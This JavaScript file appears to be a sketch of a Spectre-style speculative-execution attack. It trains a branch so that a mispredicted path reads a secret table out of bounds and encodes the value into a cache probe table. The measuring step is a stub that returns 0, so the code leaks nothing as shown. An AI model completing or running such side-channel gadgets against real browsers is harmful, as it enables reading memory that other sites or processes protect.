let junk = 0;
const speculative_repetitions = 10;
const training_number = 6;
const page_size = 6e3;
const address = 200;
const probe_length = 256;
const speculative_training_number = 10;
const secret_table = new Uint8Array(4 << 12);

function _speculativelyReadAddress() {
    const probe_table = new Uint8Array((1 + probe_length) * page_size);
    // run the speculative execution at least twice
    // the first run causes secret_table[fixed_index] to be loaded from RAM (cache miss)
    // this means that the speculative branch takes long to execute and thus is likely to get caught by the branch rollback
    // the second time that the speculative execution runs, secret_table[fixed_index] is already cached and therefore fast
    for (let j = 0; j < speculative_repetitions; ++j) {
        const delay_array = new Uint8Array(2 * page_size);
        for (let i = training_number; i > 0; --i) {
            // helper variables to optimize assembly code
            const invalid_access = (i == 1) | 0;
            const fixed_address = address * invalid_access;
            const fixed_page_size = page_size * invalid_access;
            // if (invalid_access) {
            // }
            // ensure evaluation before jump condition
            junk ^= fixed_address | fixed_page_size;
            // load condition from RAM so speculative execution gets triggered
            if (delay_array[fixed_page_size] || !invalid_access) {
                const secret_value = secret_table[fixed_address];
                // map valid accesses to the address (probe_tables)
                // map invalid accesses to their respective probe boxes
                junk ^= probe_table[(1 + secret_value) * fixed_page_size & 0xffffff];
            }
        }
    }
    // probe table
    probeTable(probe_table);
}

for (let i = 0; i < 50; ++i) {
    console.log(i);
    _speculativelyReadAddress();
}

function probeTable(x) {
    return 0;
}